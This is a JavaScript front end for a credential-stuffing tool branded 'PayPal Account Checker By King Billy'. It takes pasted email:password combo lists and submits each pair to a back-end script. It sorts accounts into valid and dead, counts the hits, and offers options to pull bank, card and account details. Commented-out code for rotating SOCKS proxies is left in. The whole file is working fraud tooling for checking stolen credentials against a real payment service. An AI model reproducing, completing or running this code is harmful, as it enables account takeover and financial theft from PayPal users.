var ajaxCall;

Array.prototype.remove = function(value){
    var index = this.indexOf(value);
    if(index != -1){
        this.splice(index, 1);
    }
    return this;
};
function enableTextArea(bool){
   // $('#socks').attr('disabled', bool);
    $('#mailpass').attr('disabled', bool);
}
function ppliveUp(){
    var count = parseInt($('#pplive_count').html());
    count++;
    $('#pplive_count').html(count+'');
}
function ppdieUp(){
    var count = parseInt($('#ppdie_count').html());
    count++;
    $('#ppdie_count').html(count+'');
}

function stopLoading(bool){
    $('#loading').attr('src', 'clear.gif');
    var str = $('#checkStatus').html();
    $('#checkStatus').html(str.replace('Checking','Stopped'));
    enableTextArea(false);
    $('#submit').attr('disabled', false);
    $('#stop').attr('disabled', true);
    if(bool){
        alert('Done! Tool By King Billy');
    }else{
        ajaxCall.abort();
    }
    updateTitle('PayPal Account Checker By King Billy');
}
function updateTitle(str){
    document.title = str;
}
//, sock
function updateTextBox(mp){
    var mailpass = $('#mailpass').val().split("\n");
    //var socks = $('#socks').val().split("\n");
    mailpass.remove(mp);
    // socks.remove(sock);
    // $('#socks').val(socks.join("\n"));
    $('#mailpass').val(mailpass.join("\n"));
}
function checkPaypal(lstMP, curMP, delim, cEmail){
    //
    if( lstMP.length<1 ||curMP>=lstMP.length ){
        stopLoading(true);
        return false;
    }
    // if(failed>=maxFail){
        // curSock++;
        // checkPaypal(lstMP, lstSock, curMP, curSock, delim, cEmail, maxFail, 0);
        // return false;
    // }
	//, lstSock[curSock]
    updateTextBox(lstMP[curMP]);
    
    ajaxCall = $.ajax({
        url: 'post.php',
        dataType: 'json',
        cache: false,
        type: 'POST',
        beforeSend: function (e) {
            updateTitle(lstMP[curMP] + ' - PayPal Account Checker By King Billy');
			$('#checkStatus').html('Checking:' + lstMP[curMP]).effect("highlight", {color:'#00ff00'}, 1000);
            $('#loading').attr('src', 'loading.gif');
		},
        data: 'ajax=1&do=check&mailpass='+encodeURIComponent(lstMP[curMP])
                +'&delim='+encodeURIComponent(delim)+'&email='+cEmail,
        success: function(data) {
            switch(data.error){
                case -1:
                    curMP++;
				//	curSock++;
                    $('#wrong').append(data.msg+'<br />').effect("highlight", {color:'#ff0000'}, 1000);
                    break;
                case 1:
                case 3:
                   // curSock++;
                    $('#badsock').append(data.msg+'<br />').effect("highlight", {color:'#ff0000'}, 1000);
                    break;
                case 2:
                    curMP++;
                    $('#ppdie').append(data.msg+'<br />').effect("highlight", {color:'#ff0000'}, 1000);
                    //failed++;
                    ppdieUp();
                    break;
                case 0:
                    curMP++;
                  //  curSock++;
                    $('#pplive').append(data.msg+'<br />').effect("highlight", {color:'#00ff00'}, 1000);
                    ppliveUp();
                    break;
            }
            checkPaypal(lstMP, curMP, delim, cEmail);
        }
    });
    return true;
}
function filterMP(mp, delim){
    var mps = mp.split("\n");
    var filtered = new Array();
    var lstMP = new Array();
    for(var i=0;i<mps.length;i++){
        if(mps[i].indexOf('@')!=-1){
            var infoMP = mps[i].split(delim);
            for(var k=0;k<infoMP.length;k++){
                if(infoMP[k].indexOf('@')!=-1){
                    var email = $.trim(infoMP[k]);
                    var pwd = $.trim(infoMP[k+1]);
                    if(filtered.indexOf(email.toLowerCase())==-1){
                        filtered.push(email.toLowerCase());
                        lstMP.push(email+'|'+pwd);
                        break;
                    }
                }
            }
        }
    }
    return lstMP;
}
$(document).ready(function(){
    $('#stop').attr('disabled', true).click(function(){
      stopLoading(false);  
    });
    $('#submit').click(function(){
        var delim = $('#delim').val().trim();
        var mailpass = filterMP($('#mailpass').val(), delim);
        var regex = /\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}/g;
       // var found = $('#socks').val().match(regex);
        var bank = $('#bank').is(':checked') ? 1 : 0;
        var card = $('#card').is(':checked') ? 1 : 0;
        var infor = $('#info').is(':checked') ? 1 : 0;
        var cEmail = $('#email').is(':checked') ? 1 : 0;
        //var maxFail = parseInt($('#fail').val());
        //var failed = 0;
        // if(found == null){
            // alert('No Sock5 found!');
            // return false;
        // }
        if($('#mailpass').val().trim()==''){
            alert('No Mail/Pass found!');
            return false;
        }
       // $('#socks').val(found.join("\n")).attr('disabled', true);
        $('#mailpass').val(mailpass.join("\n")).attr('disabled', true);
        $('#result').show();
        $('#submit').attr('disabled', true);
        $('#stop').attr('disabled', false);
        checkPaypal(mailpass, 0, delim, cEmail);
		
        return false; 
    });
});